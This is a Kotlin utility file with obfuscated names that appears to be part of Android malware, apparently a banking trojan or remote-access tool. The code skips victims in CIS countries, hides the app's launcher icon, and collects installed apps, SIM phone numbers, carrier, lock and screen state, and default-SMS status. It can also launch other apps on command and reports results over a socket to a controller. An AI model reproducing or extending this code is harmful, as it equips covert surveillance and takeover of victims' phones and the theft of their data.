package com.xxx.zzz.globp.utilssss

import android.app.KeyguardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.hardware.display.DisplayManager
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import android.provider.Telephony
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.util.Log
import android.view.Display
import android.view.WindowManager
import com.xxx.zzz.globp.Constantsfd
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONArray
import org.json.JSONObject
import java.util.Collections
import java.util.Locale


object Utilslp {

    fun blockCIS(context: Context): Boolean {
        return if (!Constantsfd.blockCIS) {
            false
        } else "[ua][ru][by][tj][uz][tm][az][am][kz][kg][md]".contains(countrySIM(context))
    }

    fun country(context: Context): String {
        val locale = context.resources.configuration.locales[0]
        return locale.displayCountry
    }

    fun countrySIM(context: Context): String {
        return runCatching {
            val tm = context.applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            var country = tm.networkCountryIso.ifEmpty { "" }
            if (country?.length != 2) {
                country = Locale.getDefault().country.lowercase()
            }
            country
        }.getOrNull() ?: "error"
    }

    fun deleteLabelIcon(context: Context) {
        try {
            val CTD = ComponentName(context, context.javaClass)
            context.packageManager.setComponentEnabledSetting(
                CTD,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: java.lang.Exception) {
            IOSocketyt.sendLogs("", "deleteLabelIcon ${e.localizedMessage}", "error")
        }
    }

    fun getAllApplication(context: Context): JSONArray? {
        try {
            val pm: PackageManager = context.packageManager
            val main = Intent(Intent.ACTION_MAIN, null)
            main.addCategory(Intent.CATEGORY_LAUNCHER)

            val list = mutableSetOf<String>()
            runCatching {
                val launchables = pm.queryIntentActivities(main, 0)
                Collections.sort(
                    launchables,
                    ResolveInfo.DisplayNameComparator(pm)
                )
                launchables.forEach { launchable ->
                    val activity = launchable.activityInfo
                    list.add(activity.packageName)
                }
            }

            val apps = pm.getInstalledApplications(0)
            for (app in apps) {
                if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                    list.add(app.packageName)
                }

                when {
                    app.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP == 1 -> {
                    }

                    app.flags and ApplicationInfo.FLAG_SYSTEM == 1 -> {
                    }

                    else -> {
                        list.add(app.packageName)
                    }
                }
            }

            val listOut = JSONArray()
            list.forEach {
                listOut.put(it)
            }

            return listOut
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "getAllApplication ${ex.localizedMessage}", "error")
            return null
        }
    }

    fun getBatteryLevel(context: Context): String {
        val bm = context.applicationContext.getSystemService(Context.BATTERY_SERVICE) as BatteryManager?
        return try {
            bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY).toString()
        } catch (e: java.lang.Exception) {
            IOSocketyt.sendLogs("", "getBatteryLevel ${e.localizedMessage}", "error")
            "-1"
        }
    }

    fun getLabelApplication(context: Context): String {
        try {
            return context.packageManager.getApplicationLabel(
                context.packageManager.getApplicationInfo(
                    context.packageName,
                    PackageManager.GET_META_DATA
                )
            ) as String
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "getLabelApplication ${ex.localizedMessage}", "error")
            Log.v("getNameApplication", "Error Method")
        }
        return ""
    }

    fun getNumber(context: Context): String {
        runCatching {
            if (context.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == PackageManager.PERMISSION_GRANTED) {
                val tMgr = context.applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager?

                var myPhoneNumber: String? = ""
                runCatching {
                    myPhoneNumber = tMgr?.line1Number
                }
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber!!

                val subscription = SubscriptionManager.from(context).activeSubscriptionInfoList
                for (i in subscription.indices) {
                    val info = subscription[i]
                    myPhoneNumber = info.number
                }
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber!!
            }
        }

        return ""
    }

    fun getNumber1(context: Context): String {
        runCatching {
            if (context.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == PackageManager.PERMISSION_GRANTED) {
                val subManager =
                    context.applicationContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val telephonyManager =
                    context.applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val subInfoList = subManager.activeSubscriptionInfoList
                var myPhoneNumber: String? = ""
                var subscriptionInfo: SubscriptionInfo? = null
                for (sub in subInfoList) {
                    if (sub.simSlotIndex == 1) {
                        subscriptionInfo = sub
                        val tmg = telephonyManager.createForSubscriptionId(sub.subscriptionId)
                        myPhoneNumber = tmg.line1Number
                    }
                }
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber

                myPhoneNumber = subscriptionInfo?.number
                if (!myPhoneNumber.isNullOrEmpty())
                    return myPhoneNumber
            }
        }

        return ""
    }

    fun getOperatorName1(context: Context): String {
        try {
            if (context.checkCallingOrSelfPermission("android.permission.READ_PHONE_NUMBERS") == PackageManager.PERMISSION_GRANTED) {
                val subManager =
                    context.applicationContext.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                val telephonyManager =
                    context.applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val subInfoList = subManager.activeSubscriptionInfoList ?: return ""
                var operatorName: String? = ""
                for (sub in subInfoList) {
                    if (sub.simSlotIndex == 1) {
                        val tmg = telephonyManager.createForSubscriptionId(sub.subscriptionId)
                        operatorName = tmg.networkOperatorName
                    }
                }
                return operatorName ?: ""
            }
        } catch (e: Exception) {
            IOSocketyt.sendLogs("", "getOperatorName1 ${e.localizedMessage}", "error")
        }

        return ""
    }

    fun getScreenResolution(context: Context): String {
        var width = 0
        var height = 0
        runCatching {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val display = wm.defaultDisplay
            val metrics = DisplayMetrics()
            display.getMetrics(metrics)
            width = metrics.widthPixels
            height = metrics.heightPixels
        }.onFailure {
            IOSocketyt.sendLogs("", "getScreenResolution ${it.localizedMessage}", "error")
        }
        return "{$width,$height}"
    }

    fun getStatSMS(context: Context): Boolean {
        return Telephony.Sms.getDefaultSmsPackage(context) == context.packageName
    }

    fun hasPermission(context: Context, perm: String): Boolean {
        return context.checkCallingOrSelfPermission(perm) == PackageManager.PERMISSION_GRANTED
    }

    fun isDualSim(context: Context): Boolean {
        return try {
            val manager = context.applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            manager.phoneCount > 1
        } catch (e: Exception) {
            IOSocketyt.sendLogs("", "isDualSim ${e.localizedMessage}", "error")
            false
        }
    }

    fun isKeyguardLocked(context: Context): Boolean {
        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        return km.isKeyguardLocked || km.isDeviceLocked
    }

    fun isScreenOn(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
            var screenOn = false
            for (display in dm.displays) {
                if (display.state != Display.STATE_OFF) {
                    screenOn = true
                }
            }
            screenOn
        } else {
            val pm = context.applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager
            pm.isScreenOn
        }
    }

    fun startApplication(app: String, force: Boolean = false, context: Context = SharedPreferencess.getAppContext()!!) {
        runCatching {
            val launchIntent: Intent? = context.packageManager.getLaunchIntentForPackage(app)
            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            launchIntent?.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            if (force)
                launchIntent?.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            launchIntent?.let {
                context.startActivity(launchIntent)
                val obj = JSONObject()
                obj.put("app", app)
                obj.put("startApplication", "ok")
                IOSocketyt.sendLogs("", obj.toString(), "startApplication")
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "startApplication ${it.localizedMessage}", "error")
        }
    }

}